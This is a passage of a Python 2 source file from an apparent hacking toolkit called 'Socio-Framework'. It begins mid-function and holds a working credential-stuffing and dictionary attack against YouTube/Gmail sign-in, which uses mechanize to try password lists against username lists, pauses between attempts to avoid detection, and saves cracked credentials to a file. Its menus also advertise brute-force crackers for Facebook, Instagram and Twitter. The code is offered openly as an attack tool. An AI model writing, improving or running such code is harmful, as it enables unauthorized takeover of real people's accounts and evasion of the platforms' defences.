				sleep(10)
			else:
				sleep(timerel)
	der = raw_input('Press enter to continue to menu, b for exit')
	if der == 'b':
		quit()
	else:
		yourobe()
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
def massyou():
	os.system('clear')
	print ""+B+" "
	print '''
	[+]========================[+]
	[+]Youtube-Account| Cracker[+]
	[+]========================[+]
	'''
	attempt = 0
	usernamelist = raw_input(color.YELLOW + 'PATH tp Username list:' + color.END)
	usernamelist = open(usernamelist, 'r')
	listeret = raw_input(color.YELLOW + 'PATH to password list:' + color.END)
	print 'Number of seconds between attempts: helps avoid suspicion from programs'
	timerel = int(raw_input('Default is 5:') or 5)
	pather = raw_input(color.YELLOW + 'You need an output to save responses|PATH to output:' + color.END)
	for username in usernamelist:
		username = username.strip()
		lister = open(listeret, 'r')
		for password in lister:
			try:
				b = mechanize.Browser()
				res = b.open('https://www.youtube.com/signin')
				b.set_handle_robots(False)
				b.select_form(nr=0)
				b.form['Email'] = username
				ier = b.submit()
				attempt = attempt+1
				password = password.strip()
				b.select_form(nr=0)
				b.form['Passwd'] = password
				er = b.submit()
				b.close()
				print "[=======================]"
				print "[Youtube-Cracker: Andrew]"
				print "[=======================]"
				if er.geturl() == 'https://www.youtube.com/':
					print('{Username:%s}') % username
					print('{Wordlist:%s}') % lister
					print('{Password:%s}') % password
					print('{Pass Attempt:%s}') % str(attempt)
					print('============================')
					print('Success!, Password Found| ' + color.GREEN + password + color.END)
					pather = open(pather, 'a')
					pather.write('\n' + 'YouTube:  Username: ' + username + ' Password:' + password + 'Attempt:' + str(attempt))
					pather.close()
					print 'Saved file! Loading Next Target.........'
					sleep(5)
					attempt = 0
					break
				else:
					os.system('clear')
					print('{Username:%s}') % username
					print('{Wordlist:%s}') % lister
					print('{Password:%s}') % password
					print('{Pass Attempt:%s}') % str(attempt)
					print('============================')
					print(color.RED + 'Password Incorrect| ' + color.GREEN + password + color.END)
					if str(attempt) == '10':
						sleep(10)
					else:
						sleep(timerel)
			except:
				print username + ' Is not affiliated with or an acceptable Gmail account'
				break
		lister.close()
				
	der = raw_input('Press enter to continue to menu, b for exit')
	if der == 'b':
		quit()
	else:
		yourobe()
		     
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
def yourobe():
    os.system('clear')
    print ""+G+" "
    print '''
    [+]==========================[+]
    [+] YouTube Account Cracker  [+]
    [+]==========================[+]
    [+]     s=single  m=Mass     [+]
    [+]==========================[+]
    [s]Single uses one account
    [m]Mass does mutiple through text file
    [e]Exit/menu
    [+]-----------------------------
    '''
    teranto = raw_input(':')
    teranto = teranto.lower()
    if teranto == 's':
		youtubecrack()
    elif teranto == 'm':
		massyou()
    elif teranto == 'e':
		der = raw_input('Press enter to continue to menu, b for exit')
		if der == 'b':
			quit()
		else:
			ymenu()
    else:
       os.system('clear')
       print"Sorry, just type s or m"
       rqw = raw_input('Press Enter to continue....')
       yourobe()
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
def ymenu():
	os.system('clear')
	print ""+R+" "
	print '''
	[+]=================[+]
	[+]YouTube-Framework[+]
	[+]=================[+]
	[1]Video-Downloader [+]
	[2]Account-Hacker   [+]
	[ ]
	[ ]
	[99]
	Plenty of options to come....
	'''
	otp = raw_input('Option:')
	if otp == '1':
		os.system('clear')
		mainlo()
	elif otp == '2':
		os.system('clear')
		yourobe()
	elif otp == '99':
		smc()
	else:
		os.system('clear')
		print 'Type in a number corrosponding to the program'
		raw_input("Press enter to continue...")
		ymenu()
    	

#========================================================================
def smc():
	os.system('clear')
	print ""+O+" "
	print '''
	[+]====================================[+]
	[+]Created by Andrew|Social-Media-crack[+]
	[+]====================================[+]
	[+]Each Social Media Program will be split
	between a single user attack or a user list
	attack.This is a bruteforce/dictionary list
	attack script.
	[1] Facebook
	[2] Instagram
	[3] Twitter
	[4] Youtube
	[5] to be determined.....
	[99] back to main menu
	 
	'''
	opt2 = raw_input('option')
	if opt2 == '1':
		fmenu()
	elif opt2 == '2':
		imenu()
	elif opt2 == '3':
		tmenu()
	elif opt2 == '4':
		ymenu()
	elif opt2 == '99':
		menu()
	else:
		os.system('clear')
		print 'Type in a number corrosponding to the program'
		raw_input("Press enter to continue...")
		smc()
#========================================================================
def menu():
	print ""+T+" "
	os.system('clear')
	print '''
	[+]==================================[+]
	[+]Created by Andrew| Socio-Framework[+]
	[+]==================================[+]
	[++++++++++++++++++++++++++++++++++++++]
	[+]       Nothing is ever safe       [+]
	[+]==================================[+]
	[1] Social-Media-Cracker
	[2] Communications-cracker
	[3] Unconventional-warefare-programs
	[4] Yet to be determined....

	'''
	opt = input('option:')
	if opt == 1:
		smc()
	elif opt == 2:
		cc()
	elif opt == 3:
		uwp()
	elif opt == 4:
		unknown()
	else:	
		os.system('clear')
		print 'Type in a number corrosponding to the program'
		raw_input("Press enter to continue...")
		menu()
		
menu()
		  
